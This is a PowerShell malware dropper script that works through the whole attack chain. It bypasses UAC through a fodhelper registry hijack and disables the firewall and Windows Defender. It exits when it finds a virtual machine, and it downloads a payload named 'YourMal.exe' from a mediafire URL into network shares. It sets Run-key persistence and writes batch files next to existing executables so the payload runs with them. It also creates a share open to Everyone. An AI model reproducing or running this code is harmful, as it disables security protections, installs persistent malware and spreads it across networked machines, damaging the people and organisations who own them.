if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        # Attempt to bypass UAC if not running as admin
        $regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
        New-Item -Path $regPath -Force | Out-Null
        New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" | Out-Null
        Set-ItemProperty -Path $regPath -Name "(default)" -Value "cmd /c start PowerShell -ArgumentList '-WindowStyle Hidden -Command Get-Process' -Verb RunAs" | Out-Null
        Start-Process "fodhelper.exe" -WindowStyle Hidden
        Start-Sleep -Seconds 2
        Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
    } catch {}
    exit
}


Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False


# Disable Windows Defender Real-time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWord -Force

# Command to disable Real-time Monitoring using reg command
Start-Process -FilePath "cmd.exe" -ArgumentList "/c reg add `"HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection`" /v DisableRealtimeMonitoring /t REG_DWORD /d 1" -Verb RunAs -WindowStyle Hidden

# Check for common VM software to avoid running in a virtual environment
if ((Get-WmiObject Win32_ComputerSystem).Model -like "*VMware*" -or (Get-WmiObject Win32_ComputerSystem).Model -like "*VirtualBox*") {
    exit  # Exit silently
}

# URL of the executable to download
$Url = "https://download1523.mediafire.com/YourMal.exe"
$FileName = [System.IO.Path]::GetFileName($Url)

# Scan for shared network folders on the local machine or across the network
$networkShares = Get-WmiObject -Class Win32_Share -Filter "Type=0"  # Disk Drive Shares

if ($networkShares.Count -eq 0) {
    # No shares found, create a new share
    $newSharePath = "C:\NewSharedFolder"
    New-Item -Path $newSharePath -ItemType Directory -Force | Out-Null
    New-SmbShare -Name "NewShare" -Path $newSharePath -FullAccess "Everyone"
    # Removed Write-Host for silent operation
}

foreach ($share in $networkShares) {
    # Directory to store downloaded executables within each share
    $SharedFolderBatchDir = Join-Path -Path $share.Path -ChildPath "BatchFiles"
    if (-not (Test-Path $SharedFolderBatchDir)) {
        New-Item -Path $SharedFolderBatchDir -ItemType Directory -Force | Out-Null  # Create directory silently
    }
    $DestinationPath = Join-Path -Path $SharedFolderBatchDir -ChildPath $FileName
    
    # Download the file to the batch files directory silently
    Start-BitsTransfer -Source $Url -Destination $DestinationPath -Priority High

    # Adding persistence
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regName = "MyAppPersistence"
    Set-ItemProperty -Path $regPath -Name $regName -Value "`"$DestinationPath`"" | Out-Null

    # Find all .exe files in the share and create corresponding batch files to run both executables
    $executables = Get-ChildItem -Path $share.Path -Filter *.exe -Recurse -File
    foreach ($exe in $executables) {
        $batchFilePath = [IO.Path]::ChangeExtension($exe.FullName, ".bat")
        $scriptContent = @"
@echo off
start /b "" "$($exe.FullName)"
start /b "" "$DestinationPath"
"@
        Set-Content -Path $batchFilePath -Value $scriptContent -Force
    }
}


exit
